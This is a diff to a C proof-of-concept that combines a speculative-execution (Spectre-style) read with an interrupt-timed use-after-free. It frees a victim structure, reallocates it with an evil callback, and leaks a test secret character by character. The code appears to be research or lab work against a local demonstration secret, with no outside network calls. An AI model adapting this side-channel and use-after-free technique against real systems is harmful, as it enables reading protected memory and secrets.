@@ -25,7 +25,7 @@ char buf[L3_CACHE_LINE_SIZE * 255 + 1]__attribute__((aligned(4096)));
 volatile int ret __cacheline_aligned;
 int freed = 0;
 int finished = 0;
-
+int LEAK_INDEX = 0;
 
 int benign_callback(int* arg)
 {
@@ -47,19 +47,13 @@ void flush_buf()
 
 void leak_secret(char *secret, int offset)
 {
-
-    //pthread_t probe_thread;
     ret = pthread_mutex_trylock(&lock);
     flush(&ret);
-   // pthread_create(&probe_thread, NULL, v_st->callback, secret+offset);
-   // nanosleep(&spec, 0);
-   // pthread_cancel(probe_thread);
-   if (likely(ret == 0))
-   {
-       v_st->callback(secret + offset);
-       pthread_mutex_unlock(&lock);
-       //printf("here!\n");
-   }
+    if (likely(ret == 0))
+    {
+        v_st->callback(secret + offset);
+        pthread_mutex_unlock(&lock);  
+    }
 }
 
 
@@ -97,37 +91,35 @@ char spectre_read(char *secret, int offset)
     
     return c;
 }
-
-void victim_thread()
+float victim_thread()
 {
-    //printf("victim here!\n");
     pin_cpu(VICTIM_CPU);
     timer_start();
     
     clock_t start = clock();
     
     pthread_mutex_lock(&lock);
-    
-   // free(v_st);
+    // This free occurs in its own tcache
+    //free(v_st);
     freed = 1;
-    float j = 0;
-    for (int i = 0; i < INT64_MAX; i += 2)
+    float j = 1;
+    for (int i = 0; i < 2000000; i++)
     {
-        i--;
+        j *= i;
     }
 
-    //  Must interrupt exactly between free and mutex unlock for this to work
     pthread_mutex_unlock(&lock);
     clock_t end = clock();
-    // free structure here?
     double time = (double)1e3 * (end - start) / CLOCKS_PER_SEC;
-    printf("Victim Thread Time: %7.2fms with timer resolution %ld\n", time, timer_length);
+    //printf("Victim Thread Time: %7.2fms with timer resolution %ld\n", time, timer_length);
     finished = 1;
-    pthread_exit(NULL);
+    return j;
 }
 
 void start_victim()
-{
+{   
+    // This free would have been done in the same thread, and can be shown to collide every time
+    //free(v_st);
     pthread_create(&victim, NULL, victim_thread, NULL);
 }
 
@@ -159,102 +151,95 @@ int main(int argc, char **argv)
     timer_length = atol(argv[1]);
     training_epochs = atol(argv[2]);
     unsigned long num_pid = atol(argv[3]);
-    struct timespec delay;
-    delay.tv_sec = 0;
-    delay.tv_nsec = 100;//(spec.it_value.tv_nsec / 200000) * 1;
 
-   // printf("argv[1] : %ld, argv[2] : %ld\n", timer_length, training_epochs);
-
-    /*
-        Set up the victim structure
-    */
-    v_st = malloc(sizeof(victim_struct));
-    v_st->callback = benign_callback;
-   // printf("Allocated victim structure.\n");
-
-    /*
-        Other setup and initialization
-    */
-    int ret = pthread_mutex_init(&lock, NULL);
-    assert(ret == 0);
-    ipi_register(NUM_THREADS);
-    timer_init(timer_length);
-    pin_cpu(ATTACKER_CPU);
-   // printf("Finished setup.\n");
-    memset(buf, 'x', sizeof(buf));
-    flush_buf();
-    train_lock();
-    printf("Trained Lock\n");
-    //pthread_mutex_lock(&lock);
-    //flush(&lock);
-    //if (likely(pthread_mutex_trylock(&lock) == 0))
-    //{
-    //    buf[*SECRET * L3_CACHE_LINE_SIZE] = 1;
-    //    pthread_mutex_unlock(&lock);
-    //}
-    //printf("Timing %d\n",  probe_timing(&buf['T'*L3_CACHE_LINE_SIZE]));
-    //leak_secret(SECRET, 0);
-    //printf("\n%c\n", spectre_read(SECRET, 0));
-    
-
-   // return 0;
-    
-    start_victim();
-    
-
-    ipi_delay(num_pid);
-
-    begin_ipi_storm();
-    //timer_wait(); // we still get delay without waiting
-    //
-    
-   // printf("Finished timer_wait()\n");
-
-    /*
-        Memory allocation collision
-        
-    */
-
-    
-   // if (!freed)
-   // {
-   //     printf("not freed!\n");
-   //     timer_cleanup();
-   //     return;
-   // }
-    
-    free(v_st);
-
-    victim_struct *p = malloc(sizeof(victim_struct));
-    p->callback = evil_callback;
-    assert(p);
-    if (v_st != p)
-    {
-        printf("UAF failed!\n");
-        timer_cleanup();
-        return;
-    }
-    if (finished)
-    {
-        printf("Finished!\n");
-        timer_cleanup();
-    }
-    printf("UAF Succeeded!\n");
-
-   // pthread_create(&probe_thread, NULL, v_st->callback, secret+offset);
-   // nanosleep(&spec, 0);
-   // pthread_cancel(probe_thread);
-
-    
-    for (int i = 0; i < strlen(SECRET); i++)
-    {
-        printf("%c", spectre_read(SECRET, i));
-    }
-        
     printf("\n");
-    kill_ipi();
-   // timer_cleanup();
+    for (;LEAK_INDEX < strlen(SECRET); LEAK_INDEX++)
+    {
+        /*
+            Set up the victim structure
+        */
+        v_st = malloc(sizeof(victim_struct));
+        v_st->callback = benign_callback;
+
+        finished = 0;
+
+        /*
+            Other setup and initialization
+        */
+        int ret = pthread_mutex_init(&lock, NULL);
+        assert(ret == 0);
+        ipi_register(NUM_THREADS);
+        timer_init(timer_length);
+        pin_cpu(ATTACKER_CPU);
+        memset(buf, 'x', sizeof(buf));
+        flush_buf();
+        train_lock();
+
+        start_victim();
+
+
+        ipi_delay(num_pid);
+
+
+        begin_ipi_storm();
+
+        if (!freed)
+        {
+            printf("not freed!\n");
+            timer_cleanup();
+            return;
+        }
+
+        /*
+            GLIBC makes use of tcache(per thread caches), and this will prevent
+            us from making our UAF work.
+
+            This can be seen because we are allowed to do a double free(v_st)
+            if it is done by different threads(i.e. victim and atacker).
+
+            We would need to disable per thread caching to make the slab collision attack
+            work in userspace.
+
+
+            We can get this to work everytime however if we just do it here.
+        */
+        //printf("Attempting memory collision!\n");
+        free(v_st);
+        victim_struct *p;
+        /*
+            Memory allocation collision 
+        */
+
+        p = malloc(sizeof(victim_struct));
+        p->callback = evil_callback;
+        assert(p);
+        
+        
+
+        if (v_st != p)
+        {
+            printf("UAF failed!\n");
+            //timer_cleanup();
+            return 2;
+        }
+        if (finished)
+        {
+            printf("Finished!\n");
+            return 2;
+            //timer_cleanup();
+            //return 2;
+        }
+        //printf("UAF Succeeded!\n");
+
+        printf("%c\n", spectre_read(SECRET, LEAK_INDEX));
+        
+        
+        kill_ipi();
+        timer_cleanup();
+        float vret;
+        pthread_join(victim, &vret);
+        free(p);
+    }
+    printf("\n");
     
-    //pthread_join(victim, NULL);
-   // while(1);
 }
